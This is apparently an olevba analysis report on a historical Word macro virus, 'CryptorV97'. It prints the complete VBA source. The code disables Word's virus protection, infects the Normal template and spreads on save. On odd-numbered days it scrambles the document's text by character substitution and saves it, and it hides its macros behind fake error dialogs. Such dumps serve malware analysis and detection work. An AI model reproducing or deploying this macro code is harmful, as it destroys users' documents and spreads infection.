olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cryptor-dfc98be0c6a5190e26d398ed19ef0a2c439dcff2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cryptor-dfc98be0c6a5190e26d398ed19ef0a2c439dcff2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CryptorV97.bas 
in file: Virus.MSWord.Cryptor-dfc98be0c6a5190e26d398ed19ef0a2c439dcff2 - OLE stream: 'Macros/VBA/CryptorV97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "CryptorV97" Then
        CryptorV97Installed = -1
    End If
Next i
If Not CryptorV97Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="CryptorV97", Object:=wdOrganizerObjectProjectItems
    MsgBox "Attention, modиle normal cryptй ????", vbCritical, "Virus CryptorV97"
End If
ErrorAO:
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAC
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 2)
Select Case D$
    Case "01", "03", "05", "07", "09", "11", "13", "15", "17", "19", "21", "23", "25", "27", "29", "31"
Selection.WholeStory
StatusBar = "Cryptage du document en cours..., HAHAHAHAHA!!!!!"
For i = 1 To 500000
Next i
With Selection.Find
        .Text = "a"
        .Replacement.Text = "@"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "b"
        .Replacement.Text = Chr$(1)
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "c"
        .Replacement.Text = Chr$(8)
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "d"
        .Replacement.Text = "("
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "e"
        .Replacement.Text = "+"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "f"
        .Replacement.Text = "$"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "g"
        .Replacement.Text = "="
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "h"
        .Replacement.Text = "-"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "i"
        .Replacement.Text = "}"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "j"
        .Replacement.Text = "з"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "k"
        .Replacement.Text = "#"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "l"
        .Replacement.Text = "\"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "m"
        .Replacement.Text = "/"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "n"
        .Replacement.Text = "~"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "o"
        .Replacement.Text = "^"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "p"
        .Replacement.Text = "]"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "q"
        .Replacement.Text = "°"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "r"
        .Replacement.Text = "І"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "s"
        .Replacement.Text = "&"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "t"
        .Replacement.Text = "|"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "u"
        .Replacement.Text = "*"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "v"
        .Replacement.Text = "и"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "w"
        .Replacement.Text = "!"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "x"
        .Replacement.Text = ";"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "y"
        .Replacement.Text = "?"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "z"
        .Replacement.Text = "§"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "0"
        .Replacement.Text = "'"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "1"
        .Replacement.Text = "["
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "2"
        .Replacement.Text = "_"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "3"
        .Replacement.Text = "`"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "4"
        .Replacement.Text = "<"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "5"
        .Replacement.Text = ">"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "6"
        .Replacement.Text = "©"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "7"
        .Replacement.Text = "®"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "8"
        .Replacement.Text = "¤"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "9"
        .Replacement.Text = "Ј"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = "."
        .Replacement.Text = "%"
End With
Selection.Find.Execute Replace:=wdReplaceAll
With Selection.Find
        .Text = ","
        .Replacement.Text = "µ"
End With
Selection.Find.Execute Replace:=wdReplaceAll
StatusBar = "Cryptage du document terminй..., HAHAHAHAHAHA!!!!"
For i = 1 To 500000
Next i
ActiveDocument.Save
    End Select
ErrorAC:
ActiveDocument.Save
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="CryptorV97", Object:=wdOrganizerObjectProjectItems
MsgBox "ZeMacroKiller98 vous remercie...", vbInformation, "Virus CryptorV97"
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Espace pile insuffisant.", vbCritical, "Microsoft Word"
ErrorFT:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "Fonction Sub non dйfini", vbCritical, "Microsoft Word"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a rйalisй une opйration illйgale et va кtre interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

